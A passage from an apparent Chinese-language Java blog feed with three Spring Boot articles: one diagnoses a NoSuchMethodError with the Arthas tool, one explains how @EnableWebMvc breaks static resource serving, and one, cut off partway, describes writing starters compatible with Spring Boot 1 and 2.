<p>Demo: <a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-NoSuchMethodError" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-NoSuchMethodError</a></p>
<h2 id="在应用的main函数里catch住异常，保证进程不退出"><a href="#在应用的main函数里catch住异常，保证进程不退出" class="headerlink" title="在应用的main函数里catch住异常，保证进程不退出"></a>在应用的main函数里catch住异常，保证进程不退出</h2><p>很多时候当应用抛出异常后，进程退出了，就比较难排查问题。可以先改下main函数，把异常catch住：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		SpringApplication.run(DemoNoSuchMethodErrorApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// block</span></span><br><span class="line">	System.in.read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Demo启动之后，抛出的异常是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.NoSuchMethodError: org.springframework.core.annotation.AnnotationAwareOrderComparator.sort(Ljava/util/List;)V</span><br><span class="line">	at org.springframework.boot.SpringApplication.getSpringFactoriesInstances(SpringApplication.java:<span class="number">394</span>)</span><br><span class="line">	at org.springframework.boot.SpringApplication.getSpringFactoriesInstances(SpringApplication.java:<span class="number">383</span>)</span><br><span class="line">	at org.springframework.boot.SpringApplication.initialize(SpringApplication.java:<span class="number">249</span>)</span><br><span class="line">	at org.springframework.boot.SpringApplication.&lt;init&gt;(SpringApplication.java:<span class="number">225</span>)</span><br><span class="line">	at org.springframework.boot.SpringApplication.run(SpringApplication.java:<span class="number">1118</span>)</span><br><span class="line">	at org.springframework.boot.SpringApplication.run(SpringApplication.java:<span class="number">1107</span>)</span><br><span class="line">	at com.example.demoNoSuchMethodError.DemoNoSuchMethodErrorApplication.main(DemoNoSuchMethodErrorApplication.java:<span class="number">13</span>)</span><br></pre></td></tr></table></figure>
<p>显然，异常的意思是<code>AnnotationAwareOrderComparator</code>缺少<code>sort(Ljava/util/List;)V</code>这个函数。</p>
<h2 id="安装arthas"><a href="#安装arthas" class="headerlink" title="安装arthas"></a>安装arthas</h2><p>参考：<a href="https://alibaba.github.io/arthas/install-detail.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/install-detail.html</a></p>
<h2 id="使用sc命令查找类所在的jar包"><a href="#使用sc命令查找类所在的jar包" class="headerlink" title="使用sc命令查找类所在的jar包"></a>使用sc命令查找类所在的jar包</h2><p>应用需要抛出了异常，但是进程还没有退出，我们用arthas来attach上去。比如在mac下面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./as.sh</span><br></pre></td></tr></table></figure>
<p>然后选择<code>com.example.demoNoSuchMethodError.DemoNoSuchMethodErrorApplication</code>进程。</p>
<p>再执行<a href="https://alibaba.github.io/arthas/sc.html" target="_blank" rel="noopener">sc</a>命令来查找类：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$ sc -d org.springframework.core.annotation.AnnotationAwareOrderComparator</span><br><span class="line"> <span class="class"><span class="keyword">class</span>-<span class="title">info</span>        <span class="title">org</span>.<span class="title">springframework</span>.<span class="title">core</span>.<span class="title">annotation</span>.<span class="title">AnnotationAwareOrderComparator</span></span></span><br><span class="line"><span class="class"> <span class="title">code</span>-<span class="title">source</span>       /<span class="title">Users</span>/<span class="title">hengyunabc</span>/.<span class="title">m2</span>/<span class="title">repository</span>/<span class="title">org</span>/<span class="title">springframework</span>/<span class="title">spring</span>/2.5.6.<span class="title">SEC03</span>/<span class="title">spring</span>-2.5.6.<span class="title">SEC03</span>.<span class="title">jar</span></span></span><br><span class="line"><span class="class"> <span class="title">name</span>              <span class="title">org</span>.<span class="title">springframework</span>.<span class="title">core</span>.<span class="title">annotation</span>.<span class="title">AnnotationAwareOrderComparator</span></span></span><br><span class="line"><span class="class"> <span class="title">isInterface</span>       <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isAnnotation</span>      <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isEnum</span>            <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isAnonymousClass</span>  <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isArray</span>           <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isLocalClass</span>      <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isMemberClass</span>     <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isPrimitive</span>       <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">isSynthetic</span>       <span class="title">false</span></span></span><br><span class="line"><span class="class"> <span class="title">simple</span>-<span class="title">name</span>       <span class="title">AnnotationAwareOrderComparator</span></span></span><br><span class="line"><span class="class"> <span class="title">modifier</span>          <span class="title">public</span></span></span><br><span class="line"><span class="class"> <span class="title">annotation</span></span></span><br><span class="line"><span class="class"> <span class="title">interfaces</span></span></span><br><span class="line"><span class="class"> <span class="title">super</span>-<span class="title">class</span>       +-<span class="title">org</span>.<span class="title">springframework</span>.<span class="title">core</span>.<span class="title">OrderComparator</span></span></span><br><span class="line"><span class="class">                     +-<span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span></span><br><span class="line"><span class="class"> <span class="title">class</span>-<span class="title">loader</span>      +-<span class="title">sun</span>.<span class="title">misc</span>.<span class="title">Launcher</span>$<span class="title">AppClassLoader</span>@5<span class="title">c647e05</span></span></span><br><span class="line"><span class="class">                     +-<span class="title">sun</span>.<span class="title">misc</span>.<span class="title">Launcher</span>$<span class="title">ExtClassLoader</span>@689<span class="title">e3d07</span></span></span><br><span class="line"><span class="class"> <span class="title">classLoaderHash</span>   5<span class="title">c647e05</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">Affect(row-cnt:1) cost in 41 ms.</span><br></pre></td></tr></table></figure>
<p>可以看到<code>AnnotationAwareOrderComparator</code>是从<code>spring-2.5.6.SEC03.jar</code>里加载的。</p>
<h2 id="使用jad查看反编绎的源代码"><a href="#使用jad查看反编绎的源代码" class="headerlink" title="使用jad查看反编绎的源代码"></a>使用jad查看反编绎的源代码</h2><p>下面使用<a href="https://alibaba.github.io/arthas/jad.html" target="_blank" rel="noopener">jad</a>命令来查看<code>AnnotationAwareOrderComparator</code>的源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jad org.springframework.core.annotation.AnnotationAwareOrderComparator</span><br><span class="line"></span><br><span class="line">ClassLoader:</span><br><span class="line">+-sun.misc.Launcher$AppClassLoader@5c647e05</span><br><span class="line">  +-sun.misc.Launcher$ExtClassLoader@689e3d07</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line">/Users/hengyunabc/.m2/repository/org/springframework/spring/2.5.6.SEC03/spring-2.5.6.SEC03.jar</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Decompiled with CFR 0_132.</span><br><span class="line"> */</span><br><span class="line">package org.springframework.core.annotation;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.Annotation;</span><br><span class="line">import org.springframework.core.OrderComparator;</span><br><span class="line">import org.springframework.core.Ordered;</span><br><span class="line">import org.springframework.core.annotation.Order;</span><br><span class="line"></span><br><span class="line">public class AnnotationAwareOrderComparator</span><br><span class="line">extends OrderComparator &#123;</span><br><span class="line">    protected int getOrder(Object obj) &#123;</span><br><span class="line">        Order order;</span><br><span class="line">        if (obj instanceof Ordered) &#123;</span><br><span class="line">            return ((Ordered)obj).getOrder();</span><br><span class="line">        &#125;</span><br><span class="line">        if (obj != null &amp;&amp; (order = obj.getClass().getAnnotation(Order.class)) != null) &#123;</span><br><span class="line">            return order.value();</span><br><span class="line">        &#125;</span><br><span class="line">        return Integer.MAX_VALUE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Affect(row-cnt:1) cost in 286 ms.</span><br></pre></td></tr></table></figure>
<p>可见，<code>AnnotationAwareOrderComparator</code>的确没有<code>sort(Ljava/util/List;)V</code>函数。</p>
<h2 id="排掉依赖，解决问题"><a href="#排掉依赖，解决问题" class="headerlink" title="排掉依赖，解决问题"></a>排掉依赖，解决问题</h2><p>从上面的排查里，可以确定</p>
<ul>
<li><code>AnnotationAwareOrderComparator</code>来自<code>spring-2.5.6.SEC03.jar</code>，的确没有<code>sort(Ljava/util/List;)V</code>函数。</li>
</ul>
<p>所以，可以检查maven依赖，把spring 2的jar包排掉，这样子就可以解决问题了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>仔细看<code>NoSuchMethodError</code>的异常信息，了解是什么类缺少了什么函数</li>
<li>利用arthas来查找类，反编绎源码，确认问题</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li><a href="https://alibaba.github.io/arthas" target="_blank" rel="noopener">Arthas–Alibaba开源Java诊断利器</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：显式配置 @EnableWebMvc 导致静态资源访问失败</title>
    <url>/spring-boot-enablewebmvc-static-404/</url>
    <content><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>当用户在自己的spring boot main class上面显式使用了<code>@EnableWebMvc</code>，发现原来的放在 <code>src/main/resources/static</code> 目录下面的静态资源访问不到了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoApplication</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(DemoApplication<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比如在用户代码目录<code>src/main/resources</code>里有一个<code>hello.txt</code>的资源。访问 <code>http://localhost:8080/hello.txt</code> 返回的结果是404：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Whitelabel Error Page</span><br><span class="line"></span><br><span class="line">This application has no explicit mapping for /error, so you are seeing this as a fallback.</span><br><span class="line"></span><br><span class="line">Thu Jun 01 11:39:41 CST 2017</span><br><span class="line">There was an unexpected error (type=Not Found, status=404).</span><br><span class="line">No message available</span><br></pre></td></tr></table></figure>
<h2 id="静态资源访问失败原因"><a href="#静态资源访问失败原因" class="headerlink" title="静态资源访问失败原因"></a>静态资源访问失败原因</h2><h3 id="EnableWebMvc的实现"><a href="#EnableWebMvc的实现" class="headerlink" title="@EnableWebMvc的实现"></a><code>@EnableWebMvc</code>的实现</h3><p>那么为什么用户显式配置了<code>@EnableWebMvc</code>，spring boot访问静态资源会失败？</p>
<p>我们先来看下<code>@EnableWebMvc</code>的实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Import</span>(DelegatingWebMvcConfiguration<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">public</span> @<span class="title">interface</span> <span class="title">EnableWebMvc</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A subclass of &#123;<span class="doctag">@code</span> WebMvcConfigurationSupport&#125; that detects and delegates</span></span><br><span class="line"><span class="comment"> * to all beans of type &#123;<span class="doctag">@link</span> WebMvcConfigurer&#125; allowing them to customize the</span></span><br><span class="line"><span class="comment"> * configuration provided by &#123;<span class="doctag">@code</span> WebMvcConfigurationSupport&#125;. This is the</span></span><br><span class="line"><span class="comment"> * class actually imported by &#123;<span class="doctag">@link</span> EnableWebMvc <span class="doctag">@EnableWebMvc</span>&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Rossen Stoyanchev</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DelegatingWebMvcConfiguration</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurationSupport</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>可以看到<code>@EnableWebMvc</code> 引入了 <code>WebMvcConfigurationSupport</code>，是spring mvc 3.1里引入的一个自动初始化配置的<code>@Configuration</code> 类。</p>
<h3 id="spring-boot里的静态资源访问的实现"><a href="#spring-boot里的静态资源访问的实现" class="headerlink" title="spring boot里的静态资源访问的实现"></a>spring boot里的静态资源访问的实现</h3><p>再来看下spring boot里是怎么实现对<code>src/main/resources/static</code>这些目录的支持。</p>
<p>主要是通过<code>org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration</code>来实现的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication</span></span><br><span class="line"><span class="meta">@ConditionalOnClass</span>(&#123; Servlet<span class="class">.<span class="keyword">class</span>, <span class="title">DispatcherServlet</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">WebMvcConfigurerAdapter</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnMissingBean</span>(<span class="title">WebMvcConfigurationSupport</span>.<span class="title">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureOrder</span>(<span class="title">Ordered</span>.<span class="title">HIGHEST_PRECEDENCE</span> + 10)</span></span><br><span class="line"><span class="class">@<span class="title">AutoConfigureAfter</span>(</span>&#123; DispatcherServletAutoConfiguration<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">ValidationAutoConfiguration</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">WebMvcAutoConfiguration</span> </span>&#123;</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</code> ，这个条件导致spring boot的<code>WebMvcAutoConfiguration</code>不生效。</p>
<p>总结下具体的原因：</p>
<ol start="0">
<li>用户配置了<code>@EnableWebMvc</code></li>
<li>Spring扫描所有的注解，再从注解上扫描到<code>@Import</code>，把这些<code>@Import</code>引入的bean信息都缓存起来</li>
<li>在扫描到<code>@EnableWebMvc</code>时，通过<code>@Import</code>加入了 <code>DelegatingWebMvcConfiguration</code>，也就是<code>WebMvcConfigurationSupport</code></li>
<li>spring再处理<code>@Conditional</code>相关的注解，判断发现已有<code>WebMvcConfigurationSupport</code>，就跳过了spring bootr的<code>WebMvcAutoConfiguration</code></li>
</ol>
<p>所以spring boot自己的静态资源配置不生效。</p>
<p>其实在spring boot的文档里也有提到这点： <a href="http://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#boot-features-spring-mvc-auto-configuration" target="_blank" rel="noopener">http://docs.spring.io/spring-boot/docs/current/reference/htmlsingle/#boot-features-spring-mvc-auto-configuration</a></p>
<ul>
<li>If you want to keep Spring Boot MVC features, and you just want to add additional MVC configuration (interceptors, formatters, view controllers etc.) you can add your own @Configuration class of type WebMvcConfigurerAdapter, but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter or ExceptionHandlerExceptionResolver you can declare a WebMvcRegistrationsAdapter instance providing such components.</li>
</ul>
<h3 id="Spring-Boot-ResourceProperties的配置"><a href="#Spring-Boot-ResourceProperties的配置" class="headerlink" title="Spring Boot ResourceProperties的配置"></a>Spring Boot ResourceProperties的配置</h3><p>在spring boot里静态资源目录的配置是在<code>ResourceProperties</code>里。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties</span>(prefix = <span class="string">"spring.resources"</span>, ignoreUnknownFields = <span class="keyword">false</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceProperties</span> <span class="keyword">implements</span> <span class="title">ResourceLoaderAware</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] SERVLET_RESOURCE_LOCATIONS = &#123; <span class="string">"/"</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123;</span><br><span class="line">			<span class="string">"classpath:/META-INF/resources/"</span>, <span class="string">"classpath:/resources/"</span>,</span><br><span class="line">			<span class="string">"classpath:/static/"</span>, <span class="string">"classpath:/public/"</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] RESOURCE_LOCATIONS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		RESOURCE_LOCATIONS = <span class="keyword">new</span> String[CLASSPATH_RESOURCE_LOCATIONS.length</span><br><span class="line">				+ SERVLET_RESOURCE_LOCATIONS.length];</span><br><span class="line">		System.arraycopy(SERVLET_RESOURCE_LOCATIONS, <span class="number">0</span>, RESOURCE_LOCATIONS, <span class="number">0</span>,</span><br><span class="line">				SERVLET_RESOURCE_LOCATIONS.length);</span><br><span class="line">		System.arraycopy(CLASSPATH_RESOURCE_LOCATIONS, <span class="number">0</span>, RESOURCE_LOCATIONS,</span><br><span class="line">				SERVLET_RESOURCE_LOCATIONS.length, CLASSPATH_RESOURCE_LOCATIONS.length);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>然后在 <code>WebMvcAutoConfigurationAdapter</code>里会初始始化相关的ResourceHandler。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration.WebMvcAutoConfigurationAdapter</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Import</span>(&#123; EnableWebMvcConfiguration<span class="class">.<span class="keyword">class</span>, <span class="title">MvcValidatorRegistrar</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">@<span class="title">EnableConfigurationProperties</span>(</span>&#123; WebMvcProperties<span class="class">.<span class="keyword">class</span>, <span class="title">ResourceProperties</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">static</span> <span class="title">class</span> <span class="title">WebMvcAutoConfigurationAdapter</span> <span class="keyword">extends</span> <span class="title">WebMvcConfigurerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Log logger = LogFactory</span><br><span class="line">      .getLog(WebMvcConfigurerAdapter<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ResourceProperties resourceProperties;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.resourceProperties.isAddMappings()) &#123;</span><br><span class="line">      logger.debug(<span class="string">"Default resource handling disabled"</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Integer cachePeriod = <span class="keyword">this</span>.resourceProperties.getCachePeriod();</span><br><span class="line">    <span class="keyword">if</span> (!registry.hasMappingForPattern(<span class="string">"/webjars/**"</span>)) &#123;</span><br><span class="line">      customizeResourceHandlerRegistration(</span><br><span class="line">          registry.addResourceHandler(<span class="string">"/webjars/**"</span>)</span><br><span class="line">              .addResourceLocations(</span><br><span class="line">                  <span class="string">"classpath:/META-INF/resources/webjars/"</span>)</span><br><span class="line">          .setCachePeriod(cachePeriod));</span><br><span class="line">    &#125;</span><br><span class="line">    String staticPathPattern = <span class="keyword">this</span>.mvcProperties.getStaticPathPattern();</span><br><span class="line">    <span class="keyword">if</span> (!registry.hasMappingForPattern(staticPathPattern)) &#123;</span><br><span class="line">      customizeResourceHandlerRegistration(</span><br><span class="line">          registry.addResourceHandler(staticPathPattern)</span><br><span class="line">              .addResourceLocations(</span><br><span class="line">                  <span class="keyword">this</span>.resourceProperties.getStaticLocations())</span><br><span class="line">          .setCachePeriod(cachePeriod));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>用户可以自己修改这个默认的静态资源目录，但是不建议，因为很容易引出奇怪的404问题。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
        <tag>spring</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：编写兼容Spring Boot1和Spring Boot2的Starter</title>
    <url>/spring-boot-starter-compatibility/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Spring Boot 2正式发布已经有段时间，应用升级之前，starter先要升级，那么如何支持Spring Boot 2？</p>
<h2 id="为什么选择starter同时兼容spring-boot-1和spring-boot-2"><a href="#为什么选择starter同时兼容spring-boot-1和spring-boot-2" class="headerlink" title="为什么选择starter同时兼容spring boot 1和spring boot 2"></a>为什么选择starter同时兼容spring boot 1和spring boot 2</h2><ul>
<li><p>从用户角度来看</p>
<p>  如果不在一个starter里兼容，比如用版本号来区分，spring boot 1的用户使用<code>1.*</code>，spring boot 2用户使用<code>2.*</code>，这样用户升级会有很大困扰。</p>
<p>  另外，我们的starter是以日期为版本号的，如果再分化，则就会出现<code>2018-06-stable-boot1</code>，<code>2018-06-stable-boot2</code>，这样子很丑陋。</p>
</li>
<li><p>从开发者角度来看</p>
<p>  要同时维护两个分支，修改代码时要合到两个分支上，发版本时要同时两个。如果有统一的bom文件，也需要维护两份。工作量翻倍，而且很容易出错。</p>
</li>
</ul>
<p>因此，我们决定在同一个代码分支里，同时支持spring boot 1/2。减少开发维护成本，减少用户使用困扰。</p>
<h2 id="编写兼容的starter的难点"><a href="#编写兼容的starter的难点" class="headerlink" title="编写兼容的starter的难点"></a>编写兼容的starter的难点</h2><p>spring boot starter的代码入口都是在各种<code>@Configuration</code>类里，这为我们编写兼容starter提供了条件。</p>
<p>但还是有一些难点：</p>
<ul>
<li>某些类不兼容，比如在spring boot 2里删除掉了</li>
<li>代码模块，maven依赖怎样组织</li>
<li>怎样保证starter在spring boot 1/2里都能正常工作</li>
</ul>
<h2 id="通过ASM分析现有的starter里不兼容的类"><a href="#通过ASM分析现有的starter里不兼容的类" class="headerlink" title="通过ASM分析现有的starter里不兼容的类"></a>通过ASM分析现有的starter里不兼容的类</h2><ul>
<li><a href="https://github.com/hengyunabc/springboot-classchecker" target="_blank" rel="noopener">https://github.com/hengyunabc/springboot-classchecker</a></li>
</ul>
<p>springboot-classchecker可以从jar包里扫描出哪些类在spring boot 2里不存在的。</p>
<blockquote>
<p>工作原理：springboot-classchecker自身在pom.xml里依赖的是spring boot 2，扫描jar包里通过ASM分析到所有的String，提取出类名之后，再尝试在ClassLoader里加载，如果加载不到，则说明这个类在spring boot 2里不存在。</p>
</blockquote>
<p>例如扫描<code>demo-springboot1-starter.jar</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn clean package</span><br><span class="line">java -jar target/classchecker-0.0.1-SNAPSHOT.jar demo-springboot1-starter.jar</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">path: demo-springboot1-starter.jar</span><br><span class="line">org.springframework.boot.actuate.autoconfigure.ConditionalOnEnabledHealthIndicator</span><br><span class="line">org.springframework.boot.actuate.autoconfigure.EndpointAutoConfiguration</span><br><span class="line">org.springframework.boot.actuate.autoconfigure.HealthIndicatorAutoConfiguration</span><br></pre></td></tr></table></figure>
<p>那么这些类在spring boot 2在哪里了？</p>
<p>实际上是改了package：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.springframework.boot.actuate.autoconfigure.health.ConditionalOnEnabledHealthIndicator</span><br><span class="line">org.springframework.boot.actuate.autoconfigure.endpoint.EndpointAutoConfiguration</span><br><span class="line">org.springframework.boot.actuate.autoconfigure.health.HealthIndicatorAutoConfiguration</span><br></pre></td></tr></table></figure>
<p>通过扫描20多个starter jar包，发现不兼容的类有：</p>
<ul>
<li>org.springframework.boot.env.PropertySourcesLoader</li>
<li>org.springframework.boot.autoconfigure.jdbc.DataSourceBuilder</li>
<li>org.springframework.boot.bind.RelaxedDataBinder</li>
<li>Endpoint/HealthIndicator 相关的类</li>
</ul>
<p>可以总结：</p>
<ul>
<li>spring boot核心的类，autoconfigure相关的没有改动</li>
<li>大部分修改的是Endpoint/HealthIndicator 相关的类</li>
</ul>
<h2 id="spring-boot-utils兼容工具类"><a href="#spring-boot-utils兼容工具类" class="headerlink" title="spring-boot-utils兼容工具类"></a>spring-boot-utils兼容工具类</h2><ul>
<li><a href="https://github.com/hengyunabc/spring-boot-utils" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-utils</a></li>
</ul>
<p>spring-boot-utils提供兼容工具类，同时支持spring boot 1/2。</p>
<h3 id="BinderUtils"><a href="#BinderUtils" class="headerlink" title="BinderUtils"></a>BinderUtils</h3><p>在spring boot 1里，注入环境变量有时需要用到<code>RelaxedDataBinder</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyProperties myProperties = <span class="keyword">new</span> MyProperties();</span><br><span class="line">MutablePropertySources propertySources = environment.getPropertySources();</span><br><span class="line"><span class="keyword">new</span> RelaxedDataBinder(myProperties, <span class="string">"spring.my"</span>).bind(<span class="keyword">new</span> PropertySourcesPropertyValues(propertySources));</span><br></pre></td></tr></table></figure>
<p>在spring boot 2里，<code>RelaxedDataBinder</code>删除掉了，新的写法是用<code>Binder</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Binder binder = Binder.get(environment);</span><br><span class="line">MyProperties myProperties = binder.bind(<span class="string">"spring.my"</span>, MyProperties<span class="class">.<span class="keyword">class</span>).<span class="title">get</span>()</span>;</span><br></pre></td></tr></table></figure>
<p>通过BinderUtils，则可以同时支持spring boot1/2：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MyProperties myProperties = BinderUtils.bind(environment, <span class="string">"spring.my"</span>, MyProperties<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>
<h3 id="ConditionalOnSpringBoot1-ConditionalOnSpringBoot2"><a href="#ConditionalOnSpringBoot1-ConditionalOnSpringBoot2" class="headerlink" title="@ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2"></a>@ConditionalOnSpringBoot1/@ConditionalOnSpringBoot2</h3><p>spring boot starter的功能大部分都是通过<code>@Configuration</code>组装起来的。spring boot 1的Configuration类，不能在spring boot 2里启用。则可以通过<code>@ConditionalOnSpringBoot1</code>，<code>@ConditionalOnSpringBoot2</code>这两个注解来分别支持。</p>
<p>其实原理很简单，判断spring boot 1/2里各自有的存在的类就可以了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConditionalOnClass</span>(name = <span class="string">"org.springframework.boot.bind.RelaxedDataBinder"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> ConditionalOnSpringBoot1 &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConditionalOnClass</span>(name = <span class="string">"org.springframework.boot.context.properties.bind.Binder"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> ConditionalOnSpringBoot2 &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Starter代码模块组织"><a href="#Starter代码模块组织" class="headerlink" title="Starter代码模块组织"></a>Starter代码模块组织</h2><p>下面以实际的一个starter来说明。</p>
<ul>
<li><a href="https://github.com/hengyunabc/endpoints-spring-boot-starter" target="_blank" rel="noopener">https://github.com/hengyunabc/endpoints-spring-boot-starter</a></li>
</ul>
<blockquote>
<p>spring boot web应用的mappings信息，可以在<code>/mappings</code> endpoint查询到。但是这么多endpoint，它们都提供了哪些url？</p>
</blockquote>
<blockquote>
<p>endpoints-spring-boot-starter的功能是展示所有endpoints的url mappings信息</p>
</blockquote>
<p><code>endpoints-spring-boot-starter</code>里需要给spring boot 1/2同时提供endpoint功能，代码模块如下：</p>
